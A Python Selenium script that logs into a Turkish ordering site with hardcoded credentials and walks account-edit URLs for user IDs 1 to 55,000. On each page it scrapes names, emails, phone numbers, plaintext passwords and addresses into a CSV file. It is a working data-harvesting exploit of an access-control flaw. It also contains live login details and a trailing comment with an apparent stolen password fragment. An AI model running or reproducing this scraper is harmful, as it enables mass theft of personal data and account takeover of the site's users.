from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys

link = "https://hamidiye.istanbul/siparis/giris.php"
browserpath = "/usr/local/bin/chromedriver"
browser = webdriver.Chrome(executable_path=browserpath)
time.sleep(3)

def login(url):
    browser.get(url)
    time.sleep(3)
    browser.find_element_by_name("gsm").click()
    time.sleep(2)
    browser.find_element_by_name("gsm").send_keys("5375447979")
    time.sleep(2)
    browser.find_element_by_name("sifre").click()
    time.sleep(2)
    browser.find_element_by_name("sifre").send_keys("12399.uo")
    time.sleep(2)
    browser.find_element_by_name("sifre").send_keys(Keys.RETURN)

def git(userId):
    mylink="https://hamidiye.istanbul/siparis/index.php?sayfa=hesap&islem=duzenle&id="+str(userId)
    browser.get(mylink)

def fileSave(data):
    file="/Users/ugurokur/Desktop/pythonsamples/hamidiye/userinfo.csv"
    f=open(file,"a+")
    f.write(data)
    f.close()

def bilgileriAl():
    ad=browser.find_element_by_name("uye_adi").get_attribute("value")
    soyad=browser.find_element_by_name("soyadi").get_attribute("value")
    eposta=browser.find_element_by_name("email").get_attribute("value")
    ceptel=browser.find_element_by_name("cepTelefonu").get_attribute("value")
    sifre=browser.find_element_by_name("sifre").get_attribute("value")
    adres=browser.find_element_by_name("adres").get_attribute("value")
    addvalue=""
    for i in adres.split():
        addvalue+=i+" "
    info=f"""ad={ad};soyad={soyad};eposta={eposta};ceptel={ceptel};şifre={sifre};adres={addvalue};\n"""
    if ((ad=="") and (soyad=="")) or ((eposta=="") and (ceptel=="")) :
        print("\n")
    else:
        print(info)
        fileSave(info)


login(link)#login
time.sleep(3) #wait

for i in range(1,55000,1):
    # print(i)
    git(i) #go to url
    time.sleep(3) #waitµ
    bilgileriAl()#get information
    time.sleep(2)



# 0004441902;şifre=*19b02a75e4!;ad
